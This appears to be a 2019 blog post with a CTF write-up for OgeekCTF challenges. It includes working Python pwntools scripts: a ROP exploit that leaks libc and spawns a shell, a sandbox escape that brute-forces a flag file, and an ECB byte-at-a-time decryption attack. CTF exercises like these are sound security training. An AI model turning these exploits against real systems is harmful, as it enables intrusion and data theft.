---
layout: post
title:  "OgeekCTF-Writeup"
date:   2019-8-26
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF]
icon: icon-html
---

# OgeekCTF-Writeup

* ### babyrop

  进入白给函数之后rop基本操作就完事了

  ```python
  from pwn import *
  
  puts_plt = 0x08048548
  puts_got = 0x08049FD4
  write_plt  = 0x8048578
  write_got = 0x8049FEC
  context.log_level = 'debug'
  libc = ELF('./libc-2.23.so')
  k = True
  write_libc = 0xf7ed9b70
  offset  = libc.symbols['write']
  p = remote('47.112.137.238',13337)
  payload1 = '\x00'*7+p64(0xff)
  p.sendline(payload1)
  print p.recv()
  payload2 = 'a'*0xe7+p32(0x1111)+p32(write_plt)+p32(0x08048825)+p32(1)+p32(write_got)+p32(10)
  print hex(len(payload2))
  p.send(payload2)
  write_libc = u32(p.recv()[0:4])
  
  log.success("Write_libc:"+hex(write_libc))
  log.success("write_offset:"+hex(offset))
  libc.address = write_libc-offset
  
  log.success("libc:"+hex(libc.address))
  log.success('system:'+hex(libc.symbols['system']))
  
  p.sendline(payload1)
  print p.recv()
  payload3 = 'a'*0xe7+p32(1111)+p32(libc.address+0x3a80c)+p32(0)*20
  p.sendline(payload3)
  
  p.interactive()
  
  
  
  ```

* ### PyBox

  * #### 非预期解

    ```python
    from pwn import *
    import string 
    chars = '{}_'+string.letters+string.digits 
    r = remote('47.112.108.17',12312)
    
    '''
    >>>f = open('/home/flag')
    >>>a = f.read()
    >>>if a[0]=='f':fuck
    try again !XD
    >>>if a[0]=='n':fuck
    '''
    flag = 'flag{'
    index = len(flag)-1
    r.sendline("f = open('/home/flag')")
    r.sendline("a = f.read()")
    r.interactive()
    while '}' not in flag:
    	for i in chars:
    		payload = 'if a[{}]==\'{}\':fuck'.format(str(index),i)
    		log.info(payload)
    		r.sendline(payload)
    		nmsl = r.recvuntil('XD',timeout=3)
    		if 'try again' in nmsl:
    			flag += i
    			log.success(flag)
    			index += 1
    			break
    r.interactive()
    
    ```

* ### 2019

  zsteg找到一串base64，解码得到一串base85，解码得到flag

* ### Babycry

  输入十六个相同字符发现密文前两个块相同，应该是ECB

  先试出来flag的长度

  根据hint，明文会被`_`填充为8的倍数，那么从1开始增加输入字符的数量，直到密文长度发生变化，即填满了一个长度为8的块后又多了一个块，就可以得到flag长度

  然后从后往前爆破flag最后八位。如爆破最后一位，把最后一位挤到一个新的块，即`}_______`，密文的最后一个块就是`}_______`的密文，再明文开头输入`*_______`，爆破*，直到密文第一个块与密文最后一个块相同，就得到了flag的最后一位。以此类推，得到flag。

  

  ```python
  from pwn import *
  import string
  chars = '{}_'+string.digits + string.letters
  r = remote('139.9.222.76',19999)
  
  def dec(plain):
  	r.recvuntil('>')
  	r.sendline('des '+ plain)
  	return r.recvline().strip()
  
  flag_len = 46
  padding_len = 2
  
  flag_ass =''
  while True:
  	block_padding_len = 7
  	fuck_len = 1
  	for i in chars:
  		log.info(i)
  		padding = (block_padding_len+padding_len+fuck_len)*'_' 
  		payload = i + flag_ass + padding
  		fuck = dec(payload)
  		if fuck[0:16] == fuck[-16:]:
  			flag_ass = i + flag_ass
  			log.success(flag_ass)
  			break
  	block_padding_len -= 1
  	fuck_len += 1
  	
  index1 = -32
  index2 = -16
  while True:
  	if len(flag_ass) != 8 and len(flag_ass) % 8 == 0:
  		index1 -= 16
  		index2 -= 16
  		print(index1,index2)
  	for i in chars:
  		log.info(i)
  		padding = padding_len*'_' 
  		payload = i + flag_ass + padding
  		fuck = dec(payload)
  		if fuck[0:16] == fuck[index1:index2]:
  			flag_ass = i + flag_ass
  			log.success(flag_ass)
  			break
  	if 'flag' in flag_ass:
  		log.success(flag_ass)
  		break
  r.interactive()
  ```

  

